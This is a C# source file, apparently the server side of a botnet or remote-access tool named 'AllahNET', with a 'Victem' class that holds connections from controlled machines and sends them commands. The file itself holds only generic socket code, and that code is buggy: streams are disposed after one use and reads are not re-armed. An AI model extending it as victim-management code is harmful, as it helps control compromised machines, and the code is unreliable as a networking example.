using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;

namespace AllahNET.Server
{
    /// <summary>
    /// شيء للعبيد
    /// </summary>
    public class Victem
    {
        public TcpClient __cilent__ { get; set; }
        public object __tag__ { get; set; }

        public Victem(TcpClient _cilent__, object _tag_ = null)
        {
            __cilent__ = _cilent__;

            if (_tag_ != null)
                __tag__ = _tag_;

            __cilent__.GetStream().BeginRead(new byte[0] { }, 0, 0, RDCB, null);
        }

        public virtual void DISP()
        {
            try
            {
                __cilent__?.Close();
                __tag__ = null;
                TcpServerEvents._instance_.___discon___(this);
            }
            catch { }
        }

        public virtual void RDCB(IAsyncResult ar)
        {
            try
            {
                using (StreamReader rdr = new StreamReader(__cilent__.GetStream()))
                {
                    string __;
                    
                    if ((__ = rdr.ReadLine()) != null)
                    {
                        TcpServerEvents._instance_.___recv___(this, __);
                    }
                }
            }
            catch (Exception _____)
            {
                Debug.WriteLine("خطأ: " + _____.ToString(), "AlahlNET");
                DISP();
                return;
            }
        }

        public virtual void SND(string ting)
        {
            try
            {
                using (StreamWriter writer = new StreamWriter(__cilent__.GetStream()))
                {
                    writer.WriteLine(ting);
                    writer.Flush();
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("خطأ: " + ex.ToString(), "AllahNET");
                DISP();
                return;
            }
        }
    }
}
